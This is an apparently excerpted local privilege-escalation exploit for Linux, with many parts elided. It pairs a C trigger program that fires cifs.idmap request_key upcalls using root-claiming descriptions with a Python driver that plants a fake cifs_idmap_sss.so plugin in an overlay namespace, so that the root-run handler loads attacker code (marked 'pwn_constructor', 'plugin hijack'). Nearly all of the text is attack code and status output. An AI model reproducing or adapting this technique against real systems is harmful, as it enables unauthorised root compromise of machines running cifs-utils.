...
static void pwn_constructor(void)
{
        ...
        if (logfd >= 0)
                dprintf(logfd, "attacker NSS loaded by cifs handler\n");
...
static void trigger_request_key(void)
{
        ...
        errno = 0;
        ret = syscall(NR_request_key, "cifs.idmap", desc, "", 0);
...
int main(int argc, char **argv)
{
        ...
        /* Try cifs.upcall-style description first (shared parser) */
        snprintf(desc, sizeof(desc),
                 "ver=0x2;host=localhost;ip4=127.0.0.1;sec=krb5;"
                 "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
                 pid);

        fprintf(stderr, "[idmap] request_key(cifs.idmap) pid=%d desc_style=upcall\n", pid);
        errno = 0;
        ret = syscall(NR_request_key, "cifs.idmap", desc, "", 0L);
        fprintf(stderr, "    rc=%ld errno=%d (%s)\n",
                ret, errno, strerror(errno));

        if (ret >= 0 || errno == ENOKEY || errno == EINTR) {
                fprintf(stderr, "[*] Handler may have run, waiting for evidence...\n");
                sleep(5);
        ...
        /* Try cifs.idmap-native description format */
        snprintf(desc, sizeof(desc),
                 "oi:ver=1;uid=0;pid=%d;upcall_target=app", pid);

        fprintf(stderr, "[idmap] request_key(cifs.idmap) pid=%d desc_style=idmap-native\n", pid);
        errno = 0;
        ret = syscall(NR_request_key, "cifs.idmap", desc, "", 0L);
        fprintf(stderr, "    rc=%ld errno=%d (%s)\n",
                ret, errno, strerror(errno));
        ...
        /* Try ci: format */
        snprintf(desc, sizeof(desc),
                 "ci:ver=1;uid=0;pid=%d;upcall_target=app", pid);

        fprintf(stderr, "[idmap] request_key(cifs.idmap) pid=%d desc_style=ci\n", pid);
        errno = 0;
        ret = syscall(NR_request_key, "cifs.idmap", desc, "", 0L);
        fprintf(stderr, "    rc=%ld errno=%d (%s)\n",
                ret, errno, strerror(errno));
        ...
        fprintf(stderr, "[-] No evidence after all attempts\n");
        sleep(2);
        return 1;
}
'''
...
def main() -> None:
    ...
    # Hijack cifs.idmap plugin — fake cifs_idmap_sss.so in overlay
    # Plugin chain: /etc/cifs-utils/idmap-plugin -> ... -> /usr/lib64/cifs-utils/cifs_idmap_sss.so
    # After setns() into our namespace, cifs.idmap loads from our overlay
    ...
    print("plugin hijack: %s" % plugin_dir, flush=True)
    ...
    try:
        ...
        if not read_evidence():
            step("TRIGGERING CIFS.IDMAP — direct trigger binary")
        ...
        if not evidence:
            if not cifs_kernel_registered():
                raise SystemExit(
                    ...
                    "cifs.ko must be loaded before cifs.idmap key type is available."
                )
            raise SystemExit(
                ...
                "cifs.idmap handler may not support setns() or NSS lookups."
            )
